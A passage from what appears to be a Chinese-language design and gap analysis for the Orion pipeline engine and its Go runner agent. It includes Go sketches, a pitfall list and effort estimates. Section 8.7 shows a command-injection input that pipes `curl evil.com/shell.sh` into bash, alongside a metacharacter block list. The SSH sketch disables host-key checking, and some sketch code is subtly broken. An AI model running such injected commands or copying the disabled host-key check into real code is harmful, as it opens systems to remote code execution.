            "os":   runtime.GOOS,
            "arch": runtime.GOARCH,
            "agent_version": AgentVersion,
        },
    })
}

// receiveLoop 接收 Platform 下发的任务（双向流）
func (a *RunnerAgent) receiveLoop(stream pb.RunnerService_ExecuteStreamClient) {
    for {
        task, err := stream.Recv()
        if err != nil {
            // 断线，重连
            log.Warn("stream recv error, reconnecting", "err", err)
            time.Sleep(backoff())
            return
        }
        a.dispatch(task)
    }
}

// dispatch 派发任务到对应协议执行器
func (a *RunnerAgent) dispatch(task *pb.ExecuteTask) {
    a.wg.Add(1)
    go func() {
        defer a.wg.Done()
        ctx, cancel := context.WithTimeout(context.Background(), a.cfg.TaskTimeout)
        defer cancel()

        executor := a.executor.Route(task.Protocol)  // 见下方协议矩阵
        if executor == nil {
            a.reportResult(task, &pb.TaskResult{Success: false, Error: "unsupported protocol"})
            return
        }

        result, err := executor.Execute(ctx, task.Payload, a.cfg.SandboxMode)
        a.reportResult(task, result)
        _ = err
    }()
}

// heartbeatLoop 心跳循环
func (a *RunnerAgent) heartbeatLoop(ctx context.Context) {
    ticker := time.NewTicker(a.cfg.HeartbeatEvery)
    defer ticker.Stop()
    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            metrics := collectResourceMetrics()
            a.client.Heartbeat(ctx, &pb.HeartbeatRequest{
                ActiveJobs: int32(a.activeJobs()),
                CpuUsage:   metrics.CPU,
                MemMB:      int32(metrics.MemMB),
                DiskMB:     int32(metrics.DiskMB),
            })
        }
    }
}

// resourceWatchdog 资源超阈值时拒绝新任务
func (a *RunnerAgent) resourceWatchdog(ctx context.Context) {
    ticker := time.NewTicker(5 * time.Second)
    defer ticker.Stop()
    for range ticker.C {
        m := collectResourceMetrics()
        if m.CPU > a.cfg.MaxCPUUsage*100 || m.MemMB > float64(a.cfg.MaxMemMB) {
            log.Warn("resource over limit, draining")
            a.setDraining(true)
            // 通知 Platform 拒绝新任务
            a.client.Drain(ctx, &pb.DrainRequest{Reason: "resource limit"})
        }
    }
}
```

### 4.5 协议矩阵设计

```go
// ============================================================
// orion-runner-agent-go/pkg/executors/router.go
// ============================================================

package executors

import "context"

// Protocol 支持的连接协议（NeatLogic 10 种中的 v1 三种）
type Protocol string
const (
    ProtoLocal   Protocol = "local"    // 本地子进程（bash/powershell）
    ProtoSSH     Protocol = "ssh"      // golang.org/x/crypto/ssh
    ProtoWinRM   Protocol = "winrm"    // 基于 SOAP over HTTPS
    // v2 扩展点（未实现，注释里预留）
    // ProtoTelnet  Protocol = "telnet"
    // ProtoIPMI    Protocol = "ipmi"
    // ProtoHTTP    Protocol = "http"
    // ProtoSNMP    Protocol = "snmp"
)

// Connector 是所有协议的统一抽象
type Connector interface {
    // Connect 建立到目标主机的连接，返回可执行的 Session
    Connect(ctx context.Context, target TargetSpec) (Session, error)
    // Name 协议名
    Name() Protocol
}

// Session 是连接后的可执行会话
type Session interface {
    // Exec 执行命令，流式返回 stdout/stderr/exit code
    Exec(ctx context.Context, cmd Command) (*ExecResult, error)
    // SendFile 上传文件到目标主机
    SendFile(ctx context.Context, localPath, remotePath string, mode int32) error
    // RecvFile 从目标主机下载文件
    RecvFile(ctx context.Context, remotePath, localPath string) error
    // Close 关闭会话
    Close() error
}

// TargetSpec 目标主机描述
type TargetSpec struct {
    Host     string
    Port     int
    User     string
    Auth     AuthMethod    // Password | PublicKey | Kerberos
    KeepAlive time.Duration
    Extra    map[string]string  // 协议特有：SSH 的 key_path, WinRM 的 kerberos_realm 等
}

// AuthMethod 认证方式
type AuthMethod interface {
    Authenticate(ctx context.Context, client ConnClient) error
}

// Executor 是命令执行器接口（比 Connector 更贴近业务）
type Executor interface {
    Protocol() Protocol
    // Execute 在目标主机执行一条命令，支持超时/取消
    Execute(ctx context.Context, target TargetSpec, cmd Command, sandbox SandboxMode) (*ExecResult, error)
    // Validate 校验 TargetSpec 完整性
    ValidateTarget(t TargetSpec) error
}

// Command 命令描述
type Command struct {
    Binary   string          // "bash" / "powershell.exe" / "cmd.exe"
    Args     []string        // ["-c", "hostname"]
    Env      map[string]string
    Workdir  string
    Stdin    []byte
    // 沙箱设置
    Sandboxed bool
}

// ExecResult 执行结果（流式友好）
type ExecResult struct {
    ExitCode int32
    Stdout   string  // 分块接收后拼装
    Stderr   string
    Duration time.Duration
    // 大输出走流式事件，不用 string 硬塞
    EventsCh <-chan ExecEvent  // Stream mode
}

// ExecutorRouter 路由：按 task.Protocol 找到对应 Executor
type ExecutorRouter struct {
    executors map[Protocol]Executor
}

func NewExecutorRouter() *ExecutorRouter {
    r := &ExecutorRouter{executors: make(map[Protocol]Executor)}
    r.executors[ProtoLocal] = NewLocalExecutor()
    r.executors[ProtoSSH] = NewSSHExecutor()
    r.executors[ProtoWinRM] = NewWinRMExecutor()
    return r
}

func (r *ExecutorRouter) Route(p Protocol) Executor {
    return r.executors[p]
}

// ============================================================
// SSH Executor 示例实现骨架
// ============================================================

type SSHExecutor struct{}

func (e *SSHExecutor) Protocol() Protocol { return ProtoSSH }

func (e *SSHExecutor) Execute(ctx context.Context, target TargetSpec, cmd Command, sandbox SandboxMode) (*ExecResult, error) {
    // 1. 从 Extra 抽取 key path
    keyPath, _ := target.Extra["key_path"]
    signers, err := parseSSHKey(keyPath, target.Auth)
    if err != nil { return nil, err }

    // 2. SSH 连接（30s 超时）
    connCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
    defer cancel()
    client, err := ssh.Dial(connCtx, "tcp", fmt.Sprintf("%s:%d", target.Host, target.Port), &ssh.ClientConfig{
        User:            target.User,
        Auth:            []ssh.AuthMethod{ssh.PublicKeys(signers...)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey, // TODO: known_hosts
        Timeout:         10 * time.Second,
    })
    if err != nil { return nil, err }
    defer client.Close()

    // 3. Session
    sess, err := client.NewSession()
    if err != nil { return nil, err }
    defer sess.Close()

    // 4. 沙箱：如果 sandbox=container，把命令包一层 docker run
    actualCmd := wrapCommand(cmd, sandbox)

    // 5. 执行，流式接收 stdout/stderr
    stdoutCh, stderrCh := make(chan string), make(chan string)
    go func() { io.Copy(stdoutCh, sess.StdoutPipe()) }()
    go func() { io.Copy(stderrCh, sess.StderrPipe()) }()

    err = sess.Run(actualCmd.String())
    // ... 汇总
    return &ExecResult{
        ExitCode: exitCodeOf(err),
        Stdout:   <-stdoutCh,
        Stderr:   <-stderrCh,
    }, nil
}
```

### 4.6 关键设计决策（专家级）

| 决策 | 选项 | 推荐 | 理由 |
|---|---|---|---|
| 协议 | gRPC vs HTTP vs NATS | **gRPC** | 双向流 + HTTP/2 多路复用 + 强类型 + keepalive 成熟 |
| 传输 | TCP/TLS vs mTLS | **mTLS (TLS 1.3)** | Agent 是"客户端+服务器"混合角色，mTLS 是唯一合理选择 |
| 认证 | X.509 vs Token vs Both | **X.509 主 + Token 备** | 证书自动轮换难但安全；token 简单但易泄漏 |
| 心跳 | 主动推送 vs 拉取 | **主动推送 + Server Watchdog** | Agent 主动更省 Platform 侧资源 |
| 断线 | 客户端重试 vs Server 感知 | **Server 感知 + 客户端快速重连** | Platform 侧 60s 无心跳即判 offline，客户端 5s/10s/20s 指数退避 |
| 命令流 | 一次性 vs 分块 vs 双工 | **stdout/stderr 分块流** | 大输出走 stream，避免 200MB 日志撑爆内存 |
| 沙箱 | 容器 vs 进程+cgroup | **两种支持，默认进程+cgroup** | 容器太重；cgroup 轻量且 Linux 5.0+ 内置 |
| 沙箱默认 | 强 vs 弱 | **弱隔离默认** | 强隔离（容器）启动慢，用户任务多为脚本 |

### 4.7 工时校准

Runner Agent 完整实施：**40-55 人天**（不含测试）。拆分：
- Go Agent 核心：15 人天
- SSH Executor：8 人天
- WinRM Executor：10 人天（SOAP 复杂）
- mTLS + 证书管理：5 人天
- 心跳/断线/重连/看门狗：5 人天
- 沙箱：5 人天
- 平台侧 gRPC Server：7 人天
- 协议定义 + proto 编译：2 人天

---

## 5. 阶段组抽象深度分析

### 5.1 NeatLogic 阶段组级策略

NeatLogic 的关键抽象：**Stage Group 是策略作用域**，不是单纯 UI 分组。

```yaml
stageGroups:
  - name: "Canary Deploy"
    strategy: GRAYSCALE
    batchConfig: { batchSize: 5, interval: 60s, pauseAfter: true }
    onFailure: STOP
    notification: { onBatch: ["email:ops@co"] }
    stages:
      - name: "Deploy Canary"
        tool: "deploy-k8s"
        params: { replicas: 1 }
      - name: "Verify Canary"
        tool: "curl-check"
        params: { url: "http://canary/service/health" }
  - name: "Full Deploy"
    strategy: BATCH
    batchConfig: { batchSize: 100, interval: 0 }
    onFailure: CONTINUE
    stages:
      - name: "Rolling Deploy"
        tool: "helm-upgrade"
```

**阶段组级策略影响整组**：GRAYSCALE 让组内所有 stage 都遵循金丝雀节奏，而不是每个 stage 独立判断。

### 5.2 Orion 当前状态

`multi_target_executor.go` 的 grayScale 是**目标级**，不是**阶段组级**：

```go
// multi_target_executor.go:64
func (mte *MultiTargetExecutor) Execute(ctx context.Context, stageName, stageID string, targets []string, mode string) *MultiTargetResult {
    // targets 分批，mode 决定失败策略
    // 但 stage 之间无关联，没有 group 概念
}
```

`grep "stage_group\|StageGroup\|阶段组" -r internal/` **0 命中**，确认完全缺失。

### 5.3 建议 Stage Group 数据模型

```go
// internal/pipeline-engine/models/stage_group.go
type StageGroup struct {
    ID          string  `json:"id" db:"id"`
    RunID       string  `json:"run_id" db:"run_id"`
    PipelineID  string  `json:"pipeline_id" db:"pipeline_id"`
    Name        string  `json:"name" db:"name"`
    Sequence    int     `json:"sequence" db:"sequence"`
    // 策略层（组级）
    Strategy    StageStrategy `json:"strategy" db:"strategy"`
    BatchConfig *BatchConfig  `json:"batch_config" db:"batch_config"`
    OnFailure   FailurePolicy `json:"on_failure" db:"on_failure"`
    // 目标层（可选，覆盖组内 stage）
    Targets     string        `json:"targets" db:"targets"`  // JSON array
    // 通知层
    NotifyOn    string        `json:"notify_on" db:"notify_on"`  // JSON array: ["onBatch","onComplete","onFailure"]
    NotifyTo    string        `json:"notify_to" db:"notify_to"`  // JSON array
    // 组内 stages
    StageIDs    []string      `json:"stage_ids" db:"stage_ids"`  // FK to pipeline_engine_stages
    // 生命周期
    Status      TaskStatus    `json:"status" db:"status"`
    StartedAt   *int64        `json:"started_at"`
    CompletedAt *int64        `json:"completed_at"`
    TenantID    string        `json:"tenant_id" db:"tenant_id"`
}

type StageStrategy string
const (
    StrategyOneshot    StageStrategy = "ONESHOT"    // 一次性全量
    StrategyBatch      StageStrategy = "BATCH"      // 分批
    StrategyGrayscale  StageStrategy = "GRAYSCALE"  // 金丝雀
    StrategyParallel   StageStrategy = "PARALLEL"   // 组内并行（无依赖）
    StrategySerial     StageStrategy = "SERIAL"     // 组内串行（默认）
)

type BatchConfig struct {
    BatchSize       int          `json:"batch_size"`
    IntervalSeconds int          `json:"interval_seconds"`
    PauseAfterBatch int          `json:"pause_after_batch"`  // 第几批后暂停等人工
    CanaryPercent   int          `json:"canary_percent"`     // GRAYSCALE 专用
}

type FailurePolicy string
const (
    FailureStop    FailurePolicy = "STOP"     // 立即停止整个组
    FailureContinue FailurePolicy = "CONTINUE" // 继续下一批
    FailureRetry   FailurePolicy = "RETRY"    // 失败目标重试 N 次
)
```

### 5.4 与 Pipeline 现有 Stage 的关系

```
Pipeline
 └── PipelineRun
      ├── StageGroup (sequence=1)         ← 新增：策略作用域
      │    ├── Stage (seq=1, strategy 继承 group)
      │    │    ├── Task
      │    │    └── Task
      │    └── Stage (seq=2, strategy 继承 group)
      └── StageGroup (sequence=2, 可独立策略)
           └── Stage (seq=1)
```

**兼容策略**：
- 未配置 StageGroup 的 Pipeline 走原路径（每个 Stage 独立）。
- 配置 StageGroup 时，`StageGroupExecutor` 包一层调度，Stage 保持原样。
- 阶段组内 Stage 之间的依赖仍走原有 `Stage.DependsOn`，组间依赖通过 `StageGroup.DependsOnGroup` 表达。

---

## 6. 执行策略深度对比

### 6.1 全量/分批/灰度语义对比

| 维度 | NeatLogic | Orion (`multi_target_executor.go`) |
|---|---|---|
| **全量（Oneshot）** | 所有目标同时执行 | 所有目标同时执行（batch=3 内并发，实际是"3 内并发"） |
| **分批（Batch）** | batchSize + interval + pauseAfter | `batchTargetCount = 3` 硬编码，无 interval，无 pause |
| **灰度（Grayscale）** | canaryPercent + 观察期 + 自动推进 | "grayScale" 模式 = 首失败即停（近似"金丝雀失败则回滚"，但无观察期、无自动扩批） |
| **金丝雀百分比** | 支持（5%/25%/100% 分档） | 无 |
| **观察期** | 支持（观察指标 5-30 分钟） | 无 |
| **自动推进** | 指标达标自动进入下一批 | 无 |

**判定**：Orion 的"grayScale" 是**语义误用**——它实现的是"stop on first batch failure"，不是真正的灰度发布。真正的灰度需要观察指标（错误率/QPS/P95），这个在 `internal/` 里没有对应实现。

### 6.2 失败中止/继续

- Orion 现状：StageOrchestrator.ExecuteStage 内 task 失败 → 后续 task SKIPPED（即"中止"）；Stage 级 FailDependentStages 会把依赖失败 stage 的下游全置 failed。
- **缺失**：无 `on_failure: continue` 开关；无"允许 N% 失败"的容错策略。
- **对齐 NeatLogic 需要**：Stage 增加 `onFailure: STOP|CONTINUE|FAIL_ON_ANY` 字段；MultiTargetExecutor 增加 `tolerancePercent`。

### 6.3 人为干预（跳过/继续/重跑）

- **CancelRun 已实现**（`Engine.go:372-420`）：把 RUNNING 任务置 FAILED，PENDING 任务置 SKIPPED。
- **缺失**：
  - **Skip 一个 stage**：`POST /runs/:id/stages/:sid/skip` —— 手工跳过某 stage，标记 SKIPPED。
  - **Resume 一个 stage**：手工把 FAILED stage 重置为 PENDING，触发继续执行。
  - **Rerun with skip successful**：`POST /runs/:id/rerun?skipSuccessful=true` —— 只对 FAILED/SKIPPED 阶段重跑。
- **工时**：12 人天（含前端 UI + 权限校验）。

### 6.4 验证作业（不可重跑）

NeatLogic 的"验证作业"是一个特殊任务类型：
- 标记 `verification: true`。
- 执行结果不参与重试策略（重跑一次就报错）。
- 常用于"验证部署后系统健康"，重跑本身可能污染结果。

Orion 无此概念。建议在 Task 增加 `IsVerification bool`，StageExecutor 内 `if task.IsVerification && task.RetryCount > 0 { return error }`。工时：3 人天。

### 6.5 状态策略矩阵（建议）

| 状态 | 定义 | 转换规则 |
|---|---|---|
| PENDING | 等待依赖/调度 | 依赖满足 → RUNNING |
| RUNNING | 执行中 | 成功 → SUCCESS；失败 → FAILED；取消 → CANCELLED |
| SUCCESS | 成功 | 终态 |
| FAILED | 失败 | 若允许重试 → PENDING；否则终态 |
| SKIPPED | 被跳过（依赖失败/人为跳过/条件为 false） | 终态 |
| TIMED_OUT | 超时（未定义但建议加） | 终态；触发重试判断 |
| DRAINED | Agent 下线中（Runner 专属） | → FAILED or PENDING（转移） |

Orion 现状：`PENDING / RUNNING / SUCCESS / FAILED / SKIPPED`（models.go:10-27），缺 `TIMED_OUT`。

---

## 7. Orion 关键短板（P0/P1，专家视角）

### P0-1：上游任务输出无法跨 stage 传播（严重）

**证据**：`StageExecutor.go:503-511` 代码自证注释"Upstream task outputs are not yet propagated to dependent stages"。

**影响**：
- 无法实现"build 输出 commit_hash → deploy 消费 commit_hash"这种最基本的 CI/CD 链。
- 无法实现"扫描输出漏洞列表 → 修复 stage 按列表操作"。
- sub-pipeline 只能传 Context（YAML 静态值），无法消费子流水线结果。

**修复**：§3.4 的 ParamStore + `RecordTaskOutput` + 输出持久化到 `pipeline_tasks.result`。

### P0-2：Runner Agent 协议矩阵缺失（严重）

**证据**：全仓 grep 无 ssh/winrm/telnet/ipmi 关键字；`orion-runner-agent` 只有本地 exec。

**影响**：
- Windows Server 运维完全空白。
- 内网隔离设备无法执行。
- AIX/HP-UX 等老系统无法覆盖。
- 与 CMDB 联动失效：CMDB 记录了 5000 台主机，Runner 一台都执行不了。

**修复**：§4.4 的 Go Agent + SSH/WinRM Executor。

### P0-3：参数引用无命名空间 + 字符串盲替换（严重）

**证据**：`StageExecutor.resolveTaskParameters` 用 `strings.ReplaceAll`。

**影响**：
- 变量名含 JSON 特殊字符（如 `{`、`}`、`"`）会破坏 JSON。
- 全局参数与作业参数同名时无法区分。
- 变量值本身含 `${...}` 不会展开，行为不可预测。

**修复**：§3.4 的 ParamStore AST 遍历 + 环检测。

### P1-4：Stage 内任务强制串行，无并行策略（重要）

**证据**：`StageOrchestrator.ExecuteStage` 里 `for _, task := range tasks` 顺序执行。

**影响**：多目标部署场景（stage 内多个 task 分别部署不同服务）无法并行；每个 task 都受 timeout=3600s 影响，慢任务拖死整个 stage。

**修复**：Task 增加 `parallel: true` + `dependsOn: [taskName1, taskName2]`；用 errgroup 并行执行；工时：8 人天。

### P1-5：MultiTargetExecutor batch 硬编码 = 3（重要）

**证据**：`multi_target_executor.go:13 const batchTargetCount = 3`。

**影响**：无法针对 5000 台设备做 batch=500 的分批；也无法做 canary=5% 的灰度。

**修复**：从 Stage.BatchSize 或 StageGroup.BatchConfig.BatchSize 读取；工时：3 人天。

### P1-6：`oneshot` 命名误导（中等）

**证据**：`multi_target_executor.go:60-62` 注释"oneshot mode: runs all batches, continues even if one fails"——**这是 CONTINUE 语义，不是一次性执行**。命名与语义不符。

**影响**：调用方（前端 UI）看到 "oneshot" 会以为是"不重跑"，实际是"失败继续"。

**修复**：重命名为 `continue_on_failure`；工时：1 人天。

### P1-7：Sub-pipeline 无法消费子流水线输出（重要）

**证据**：`executeSubPipelineTask` 只返回 `run.ID / run.Status / run.DurationMs`，不返回子流水线的 outputs。

**影响**：sub-pipeline 只是"通知执行"，无实际数据回传。

**修复**：TriggerRequest 增加 `outputKeys []string`，Execute 后按 key 提取子流水线 context 中的值；工时：4 人天。

### P1-8：Checkpoint 只保 state，不保任务中间产物（重要）

**证据**：`Checkpoint.State` 只存 `CompletedStages / FailedStages / TaskOutputs`（且是字符串 map），不存 stdout/stderr、下载文件、临时目录。

**影响**：崩溃恢复后长任务（如 4h 的 SQL migration）无法从中间状态续跑，只能从头。

**修复**：引入 Temporal 式 event sourcing，或简化版"task-level WAL"；工时：20 人天。

---

## 8. 领域特有反模式 / 陷阱

### 8.1 参数循环引用

**陷阱**：`A = "${B}"`，`B = "${A}"` → 无限递归 → goroutine 栈溢出。

**防护**：
- 解析栈 `resolving []string`，进入 ref 前 push，退出 pop；命中已有则报错。
- 最大展开深度 = 20。
- **绝不允许同来源同路径递归**（`A = "${JOB.A}"` 直接语法错误）。

### 8.2 死锁（互相等待输出）

**陷阱**：Stage A 等 Stage B 的 `output.port`，Stage B 等 Stage A 的 `output.host`；A、B 都 PENDING，永远无法进入 RUNNING。

**防护**：
- PipelineEngine 启动时跑一次静态分析：`detectOutputCycles(spec.Stages)` 用图论 SCC（Tarjan 算法）检测强连通分量。
- 有环直接 ErrInvalidSpec。

### 8.3 阶段组超时传播

**陷阱**：组超时 30min，但组内某 stage 已跑 25min；再启下一个 stage 时会立即超时。

**防护**：
- StageGroup 内 Stage 使用**剩余时间**，不是独立 timeout。
- Stage.timeout_seconds 是"最长"，StageGroup.timeout 是"总时限"，两者取小。

### 8.4 Agent 断线数据一致性

**陷阱**：Agent 执行到一半断线，Platform 认为任务失败，但 Agent 端 stdout/stderr 已产生。重跑产生重复副作用（数据库写入、文件写入）。

**防护**：
- 引入 `idempotency_key`：任务携带 UUID，Agent 收到同 key 任务直接返回上次结果。
- Platform 侧持久化任务执行状态，重连后 Agent 上报"我在执行 X 任务"，Platform 补写中间日志。
- 高危任务（写入类）建议幂等命令 + 事务。

### 8.5 大规模执行目标雪崩

**陷阱**：一次部署 5000 台设备，MultiTargetExecutor batch=3 会启动 5000 个 goroutine，Runner Agent 队列瞬间积压，Platform DB 状态表被打爆。

**防护**：
- **全局并发上限**：Platform 侧 `pipeline_runs.concurrency_limit`（默认 500）。
- **每 Agent 并发上限**：`runner_agents.max_concurrent`（默认 5）。
- **每租户并发上限**：`tenant_settings.pipeline_concurrency`（默认 100）。
- **排队 + 背压**：超过上限入队，Agent 有心跳时按序派发。

### 8.6 长作业日志爆炸

**陷阱**：`tail -f /var/log/xxx` 任务 stdout 达 500MB，`Task.Log` JSONB 列被撑爆，DB 磁盘告警。

**防护**：
- Task.Log 只存最后 1MB + 首 1MB；中间走对象存储（S3/OSS）分片。
- `pipeline-sse/` 已经有 SSE 通道，日志流式推送 + 归档。
- 硬上限：单个 task 日志 100MB，超过截断 + 告警。

### 8.7 命令注入风险

**陷阱**：任务参数 `command: "rm -rf ${USER_INPUT}/"`，用户输入 `"; curl evil.com/shell.sh|bash"` → 平台被打穿。

**防护**：
- `Executor.Execute(cmd Command)` 用**结构化参数**（`Binary` + `Args []string`）而非字符串拼接。
- `Args` 中每个元素独立校验，禁止 `;`、`|`、`&&`、`$(...)`、`` ` `` 等 shell 元字符。
- 高危字符命中直接拒绝，不允许 escape。
- 参数来源审计：`SrcJob` 的用户输入默认走严格校验；`SrcGlobal`/`SrcStatic` 由管理员录入，可信但仍建议校验。

### 8.8 Agent 资源失控

**陷阱**：Agent 被派 100 个任务，CPU 打满 100%，主机宕机。

**防护**：
- Agent 侧 `MaxConcurrent`（默认 5）。
- Agent 侧资源看门狗：CPU > 2% 或 Mem > 200MB 自动 drain。
- Agent 侧任务超时兜底（默认 1h，硬上限 24h）。
- Platform 侧全局并发限流（§8.5）。

### 8.9 幂等性破坏

**陷阱**：任务被重复执行两次（重试 + 手动重跑），产生两次副作用（如"发两次邮件"、"创建两个工单"）。

**防护**：
- 所有任务携带 `idempotency_key`（默认 task ID）。
- Agent 收到重复 key 任务，返回缓存结果。
- 高风险任务标注 `verification: true` 或 `no_retry: true`。
- Sub-pipeline 通过 depth 防重入（已有）。

---

## 9. Phase 建议 + 工时校准

### Phase 0（P0 阻塞，必须做）：参数链 + 上游输出传播

- **范围**：§3.4 ParamStore + `RecordTaskOutput` + Task.Outputs 持久化 + 跨 stage 引用
- **工时**：25 人天
- **验收**：`build commit_hash` → `deploy image_tag` 端到端跑通

### Phase 1（P0 阻塞）：Runner Agent 协议矩阵 v1

- **范围**：§4.4 Go Agent 重写（gRPC + mTLS）+ SSH Executor + 本地 Executor
- **工时**：35 人天
- **验收**：Agent 通过 SSH 远程执行 100 台 Linux 主机，Platform 侧可视化日志

### Phase 2（P1 重要）：StageGroup 抽象 + 分批/灰度真语义

- **范围**：§5.3 StageGroup 表 + `StageGroupExecutor` + 组级策略
- **工时**：20 人天
- **验收**：5000 台主机金丝雀部署（5%/25%/50%/100% 分档）

### Phase 3（P1 重要）：人为干预 API + 重跑

- **范围**：Skip / Resume / Rerun-with-skip-successful / Verification flag
- **工时**：15 人天
- **验收**：运维手工跳过失败 stage 后续跑通

### Phase 4（P1 重要）：参数类型 + 参数模板

- **范围**：§3.3 的 10 种参数类型 + 参数模板 CRUD + 批量绑定
- **工时**：20 人天
- **验收**：一个 Linux 部署参数模板绑定 10 个作业，改模板后同步

### Phase 5（P2）：WinRM + Windows Agent + Telnet/IPMI

- **范围**：Windows Server 2016/2019/2022 + AIX + 老设备带外管理
- **工时**：40 人天
- **验收**：Windows Server 补丁批量部署

### Phase 6（P2）：图形化设计器 + 拖拽

- **范围**：前端 pipeline 编辑器（当前 WorkflowDesigner 不消费 backend）
- **工时**：30 人天
- **验收**：拖拽 3 stage + 连线依赖，后端可执行

### 总工时

- **P0（Phase 0+1）**：**60 人天**（不可跳过）
- **P1（Phase 2+3+4）**：**55 人天**
- **P2（Phase 5+6）**：**70 人天**
- **合计**：**~185 人天**（不含 UI 打磨、文档、SRE 部署）

**对比现有分析**：
- `neatlogic-feature-comparison-upgrade-2026-09-30.md` 中的编排模块估算是 289 人天 / 30-36 周，本报告聚焦编排引擎，185 人天 / 8-10 周（3-4 人团队）——**范围更小，估算更细**。

### 优先级建议

1. **P0 必做**（Phase 0+1 = 60 人天）：不做则运维自动化能力 = 0，只是 CI/CD 骨架。
2. **P1 强推**（Phase 2-4 = 55 人天）：与 CMDB 联动是差异化卖点，必须做。
3. **P2 缓做**（Phase 5-6 = 70 人天）：Windows/AIX/图形化设计器按需。

---

## 附：代码证据索引

| 关键发现 | 文件路径 | 行号 |
|---|---|---|
| Pipeline 拓扑排序 + 循环检测 | `pipeline-engine/service/Engine.go` | 167-170, 317-369 |
| Sub-pipeline 深度守卫 | `pipeline-engine/service/StageExecutor.go` | 18, 343-355 |
| Upstream task outputs 未传播（自证） | `pipeline-engine/service/StageExecutor.go` | 503-511 |
| Stage 内 tasks 严格串行 | `pipeline-engine/service/StageOrchestrator.go` | 196-210 |
| `oneshot` 语义 = 失败继续 | `pipeline-engine/service/multi_target_executor.go` | 59-62, 94-99 |
| batch=3 硬编码 | `pipeline-engine/service/multi_target_executor.go` | 13 |
| 参数字符串盲替换 | `pipeline-engine/service/StageExecutor.go` | 462-479 |
| Stage.Condition 只支持 ==/!= | `pipeline-engine/service/StageOrchestrator.go` | 295-329 |
| Runner Agent 只支持本地 exec | `orion-runner-agent/src/TaskExecutor.ts` | 全文 |
| Runner Agent Bearer token（非 mTLS） | `orion-runner-agent/src/index.ts` | 107-115 |
| Runner heartbeat 30s | `orion-runner-agent/src/index.ts` | 34, 221 |
| AutoExecEngine SPI（PluginHandler） | `auto-exec/engine/engine.go` | 27-32 |
| Runner TaskType 仅 7 种 | `runner/models/models.go` | 264-272 |
| ExecutionMode 3 种（未接线） | `execution-mode-engine/models/models.go` | 3-9 |
| 无 StageGroup（全仓 grep） | `internal/**` | 0 命中 |
| 无 SSH/WinRM/Telnet/IPMI（全仓 grep） | `internal/**` | 0 命中 |
